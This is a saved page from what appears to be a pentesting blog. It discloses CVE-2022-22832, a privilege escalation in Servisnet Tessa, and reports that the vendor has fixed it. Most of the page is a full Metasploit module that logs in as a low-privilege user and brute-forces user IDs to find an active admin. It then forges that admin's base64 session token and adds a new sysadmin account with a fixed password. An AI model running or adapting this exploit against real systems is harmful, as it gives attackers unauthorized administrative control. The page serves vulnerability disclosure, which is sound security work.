<!DOCTYPE html>
<!-- saved from url=(0025)https://pentest.com.tr/ -->
<!-- pentest-com-tr_FLAG_1{son_kaynak_kod_bukucu} -->
<html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Pentest Blog - Self-Improvement to Ethical Hacking</title>
    <link rel="shortcut icon" href="../images/favicon.ico">
    <link rel="stylesheet" href="./exploits_files/style.css">
    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="https://pentest.com.tr/feed/">
    <link rel="stylesheet" href="./highlight/styles/default.css">
    <script src="./highlight/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script async="" src="./exploits_files/analytics.js"></script><script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-69613510-1', 'auto');
    ga('send', 'pageview');

</script>

<link type="text/css" rel="stylesheet" charset="UTF-8" href="./exploits_files/translateelement.css"></head>


    <body cz-shortcut-listen="true">

    <header>
    <div id="banner">

 ââââââ âââ  ââââââ  ââââââ   âââââââââââ
âââââââââââ âââââââ âââââââ   âââââââââââ
âââââââââââââââ âââââââ âââ   âââââââââââ
âââââââââââââââ âââââââ âââ   âââââââââââ
âââ  ââââââ  ââââââ  ââââââââââââââââââââ
âââ  ââââââ  ââââââ  âââ âââââââ ââââââââ
                                         
"I know Hack and I believe in Hak. So...You have no chance :/"
   </div>
</header>

    
<div class="menu">
    <ul>
        <li><a href="../index.html">Root</a></li>
        <li><a href="/blog/">Blog</a></li>
        <li><a href="/pentest/">Pentest</a></li>
        <li><a href="/whoami/">Whoami</a></li>
        <li><a href="/exploits/">Exploits</a></li>
    </ul>
</div>


    <main>
        <div style="width:100%;text-align:right;">
</div>


<div class="post">

  <header class="post-header">
    <h2>CVE-2022-22832</h2>
    <h2>EDB-ID: 50712</h2>
    <p class="meta">
        05 Jan, 2022
        
        
        â¢
        <span>EXPLOIT</span>
    </p>
  </header>
  <li>The vulnerability was discovered during a permission penetration test.</li>
  <li>Vendor fixed this vulnerability. Added a new HTTP header <span style="color: #1f8937;">"User-auth" after login.</span>.Details are below.</li>
  <li><a href="https://pentest.com.tr/exploits/Servisnet-Tessa-Add-sysAdmin-User-Unauthenticated.html" target="_blank">Servisnet Tessa - Add sysAdmin User Vulnerability </a></li>
  <li><a href="https://pentest.com.tr/exploits/Servisnet-Tessa-MQTT-Credentials-Dump-Unauthenticated.html" target="_blank">Servisnet Tessa - MQTT Credentials Dump Vulnerability </a></li>
  <li><a href="https://www.exploit-db.com/exploits/50712" target="_blank">Exploit-DB Link </a></li>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22832" target="_blank">CVE-Mitre Link</a></li>
  <li><a href="https://pentest.com.tr/exploits/servisnet_tessa_privesc.rb" target="_blank">Download servisnet_tessa_privesc.rb (Metasploit)</a></li>
<p></p>
This module exploits privilege escalation in Servisnet Tessa, triggered by add new sysadmin user with any user authorization .
		An API request to "/data-service/users/[userid]" with any low-authority user returns other users' information in response.
                The encrypted password information is included here, but privilage escelation is possible with the active sessionid value.
<p></p>
                var token = Buffer.from(`${user.username}:${user.usersessionid}`, 'utf8').toString('base64');
<p></p>
                The logic required for the Authorization header is as above.
                Therefore, after accessing an authorized user ID value and active sessionId value, 
                if the username and sessionId values are encoded with base64, a valid Token will be obtained and a new admin user can be added.
<p></p>
<p></p>
<p></p>
<h3>Analysis of Vulnerability</h3>
<p></p>
Any user authorized in the application can access the information of any user by making a request to the "/users/[userid]" field with the token information obtained. 
<p></p>
Therefore, by obtaining the "usersessionid" corresponding to this information, a token can be produced in accordance with the below condition. 
<p></p>
<article class="post-content">
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">token = Buffer.from(`${user.username}:${user.usersessionid}`, 'utf8').toString('base64');
</span></code></pre></div></div>
<p></p>
In this direction, it is possible to add a new administrator user to the database by creating a token for the administrator user.
<p></p>
<img class="center" src="../images/servisnet-priv-1.png">
<p></p>
The attacker or any user in the application can generate tokens with the sessionid obtained by reading the information of other users. 
<p></p>
E.g; When the user ID value obtained by the brute force process is "200", the "role_name":"System Admin" value indicates that the user is an administrator, while the user name with the "username" parameter and the active session information can be learned with the "usersessionid" parameter. 
<p></p>
So, by encoding the entire username:sessionid with base64, the attacker copies the token value of an active administrator. Afterwards, he can add a new admin user to the system with the information he has determined.
<p></p>
<img class="center" src="../images/servisnet-priv-2.png">
<p></p>
If the user is not active in the system at that moment, this method does not work. Therefore, the ID value of all administrator authorized users in the application should be learned and it should be checked whether each user is active with the sessionid value. 
<p></p>
In order to exploit the vulnerability quickly and successfully, a metasploit module has been prepared.
<p></p>
<img class="center" src="../images/servisnet-priv-3.png">
<p></p>
A loop like the one above will discover an active admin user and try the obtained token to add a new user.
<p></p>
<p></p>
<p></p>
<p></p>
<h2>Servisnet Tessa - Add sysAdmin User (Unauthenticated) (Metasploit)</h2>
<p></p>
<p></p>
  <article class="post-content">
  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Servisnet Tessa - Privilege Escalation (Metasploit)',
      'Description'    => %q(
        This module exploits privilege escalation in Servisnet Tessa, triggered by add new sysadmin user with any user authorization .
		An API request to "/data-service/users/[userid]" with any low-authority user returns other users' information in response.
                The encrypted password information is included here, but privilage escelation is possible with the active sessionid value.

                var token = Buffer.from(`${user.username}:${user.usersessionid}`, 'utf8').toString('base64');

                The logic required for the Authorization header is as above.
                Therefore, after accessing an authorized user ID value and active sessionId value, 
                if the username and sessionId values are encoded with base64, a valid Token will be obtained and a new admin user can be added.		

      ),
      'References'     =>
        [
          [ 'CVE', 'CVE-2022-22832' ],
          [ 'URL', 'https://pentest.com.tr/exploits/Servisnet-Tessa-Privilege-Escalation.html' ],
          [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
        ],
      'Author'         =>
        [
          'Ãzkan Mustafa AKKUÅ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 22 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true
        }
    ))

    register_options([
	OptString.new('USERNAME',  [true, 'Servisnet Username']),
        OptString.new('PASSWORD',  [true, 'Servisnet Password']),
        OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
    ])
  end
  # split strings to salt
  def split(data, string_to_split)  
    word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end  
  # split JSONs to salt
  def splitJSON(data, string_to_split)  
    word = data.scan(/"#{string_to_split}":"([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end 
  # split JSONs to salt none "
  def splitJSON2(data, string_to_split)  
    word = data.scan(/"#{string_to_split}":([\S\s]*?),/)[0]
    string = word.split('"]').join('').split('["').join('')
    return string
  end 

  def app_path
    res = send_request_cgi({
    # default.a.get( check 
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
	  'method'  => 'GET'
    })  	
	
    if res && res.code == 200 && res.body =~ /baseURL/
      data = res.body
      #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
      base_url = data.scan(/baseURL: '\/([\S\s]*?)'/)[0]  
      return base_url
    else
      fail_with(Failure::NotVulnerable, 'baseURL not found!')
    end
  end

  def add_user(token, app_path)
     newuser = Rex::Text.rand_text_alpha_lower(8)	
     id = Rex::Text.rand_text_numeric(4)   
     # encrypted password hxZ8I33nmy9PZNhYhms/Dg== / 1111111111
     json_data = '{"alarm_request": 1, "city_id": null, "city_name": null, "decryptPassword": null, "email": "' + newuser + '@localhost.local", "id": ' + id + ', "invisible": 0, "isactive": 1, "isblocked": 0, "levelstatus": 1, "local_authorization": 1, "mail_request": 1, "name": "' + newuser + '", "password": "hxZ8I33nmy9PZNhYhms/Dg==", "phone": null, "position": null, "region_name": "test4", "regional_id": 0, "role_id": 1, "role_name": "Sistem Admin", "rolelevel": 3, "status": null, "surname": "' + newuser + '", "totalRecords": null, "try_pass_right": 0, "userip": null, "username": "' + newuser + '", "userType": "Lokal KullanÄ±cÄ±"}'

     res = send_request_cgi(
       {
       'method' => 'POST',
       'ctype'  => 'application/json',
       'uri' => normalize_uri(target_uri.path, app_path, 'users'),
       'headers' =>
         {
           'Authorization' => token
         },
       'data' => json_data
      })

      if res && res.code == 200 && res.body =~ /localhost/
        print_good("The sysAdmin authorized user has been successfully added.")
        print_status("Username: #{newuser}")
        print_status("Password: 1111111111")
      else
        fail_with(Failure::NotVulnerable, 'An error occurred while adding the user. Try again.')
      end
  end

  def sessionid_check

    res = send_request_cgi({
    # user.usersessionid check 
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
	  'method'  => 'GET'
    })  	
	
    if res && res.code == 200 && res.body =~ /user.usersessionid/ 
          return Exploit::CheckCode::Vulnerable
	else
	  fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
	end

  end

  def find_admin(token, userid, app_path)	

    res = send_request_cgi({
    # token check 
      'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
      'headers' =>
         {
           'Authorization' => token
         },
      'method'  => 'GET'
    })     

    if not res && res.code == 200 && res.body =~ /usersessionid/
      fail_with(Failure::NotVulnerable, 'An error occurred while use Token. Try again.')
    end

    loopid = userid.to_i
    $i = 0
    # The admin userid must be less than the low-authority userid.
    while $i < loopid  do
      $i +=1
      res = send_request_cgi({
       # token check 
         'uri'     => normalize_uri(target_uri.path, app_path, 'users', $i),
         'headers' =>
            {
              'Authorization' => token
            },
         'method'  => 'GET'
       })  

       if res.code == 200 and res.body.include? '"Sistem Admin"' 
         admin_uname = splitJSON(res.body, 'username')
         admin_sessid = splitJSON(res.body, 'usersessionid') 
         admin_userid = splitJSON2(res.body, 'id')
         enc_token = Rex::Text.encode_base64('' + admin_uname + ':' + admin_sessid + '')
         token_admin = 'Basic ' + enc_token + ''
         print_good("Excellent! Admin user found.")
         print_good("Admin Username: #{admin_uname}")
         print_good("Admin SessionId: #{admin_sessid}")
         if session_check(token_admin, admin_userid, admin_uname) == "OK"
           break
         end
       end 
     end
  end

  def session_check(token, userid, user) 	
	
      res = send_request_cgi({
       # session check 
         'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
         'headers' =>
            {
              'Authorization' => token
            },
         'method'  => 'GET'
       })  

       if res && res.code == 200 && res.body =~ /managers_codes/
         print_good("Admin session is active.")
         add_user(token, app_path)
         return "OK"
       else
         print_status("Admin user #{user} is not online. Try again later.")
         return "NOT"
       end   
  end

  def login_check(user, pass)

     json_data = '{"username": "' + user + '", "password": "' + pass + '"}'

     res = send_request_cgi(
       {
       'method' => 'POST',
       'ctype'  => 'application/json',
       'uri' => normalize_uri(target_uri.path, app_path, 'api', 'auth', 'signin'),
       'data' => json_data
      })	
	
      if res && res.code == 200 && res.body =~ /usersessionid/
	sessid = splitJSON(res.body, 'usersessionid')
	userid = splitJSON2(res.body, 'id')
	print_status("Sessionid: #{sessid}")  
	print_status("Userid: #{userid}")
        enc_token = Rex::Text.encode_base64('' + user + ':' + sessid + '')
        token = 'Basic ' + enc_token + ''
	print_status("Authorization: #{token}")
        find_admin(token, userid, app_path)
 

      else
        fail_with(Failure::NotVulnerable, 'An error occurred while login. Try again.')
      end
  end

  def check 	
	
    if sessionid_check 
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
  
  def run
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    login_check(datastore['USERNAME'], datastore['PASSWORD'])    
  end
end
</span></code></pre></div></div>
<p></p>
<p></p>
<p></p>
<img class="center" src="../images/servisnet-priv-5.png">
<p></p>
<img class="center" src="../images/servisnet-priv-4.png">
<p></p>
<p></p>
<p></p>
  </article>

  <div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://akkus-ethical-hacking.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


    </main>

    <footer>
    Â© Copyright, 2017 | Sponsored by <li><a href="https://nationalkeep.com" target="_blank">National Keep</a></li>
</footer>

    <script id="dsq-count-scr" src="./exploits_files/count.js" async=""></script>
    

<iframe style="display: none;" src="./exploits_files/saved_resource(1).html"></iframe></body></html>
